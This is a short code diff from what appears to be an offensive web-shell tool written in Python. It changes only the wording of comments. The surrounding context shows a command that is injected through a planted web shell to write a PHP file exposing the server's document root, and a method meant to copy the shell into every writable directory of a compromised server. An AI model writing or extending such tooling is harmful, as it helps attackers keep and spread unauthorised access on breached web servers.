@@ -9,7 +9,7 @@ class LinuxVersion(object):
 
     def get_doc_root(self):
         cmd = "echo \"<?php echo \$_SERVER['DOCUMENT_ROOT']; ?>\" > ~doc_root.php; [ -r ~doc_root.php ] && echo exists || echo not_exist"
-        # make a request to create a php file thx @0xAli
+        # Make a request to create a php file (thanks @0xAli)
         if make_request.get_page_source(cmd)[0] == 'exists':
             make_request.url = make_request.url.replace(make_request.url.split('/')[-1], '~doc_root.php')
             doc_root = urlopen(make_request.url).read().strip()
@@ -37,7 +37,7 @@ class LinuxVersion(object):
 
 
 class ShellHandler(object):
-    # a method to spread the shell in all writable directories
+    # A method to spread the shell in all writable directories
     def spread_shell(self):
         provided_shell_name = raw_input('\n{0}[!] Current shell name{1}: '.format(Colors.RED, Colors.END))
         shell_name = getargs.url.split('/')[-1] if getargs.method == 'post' else provided_shell_name
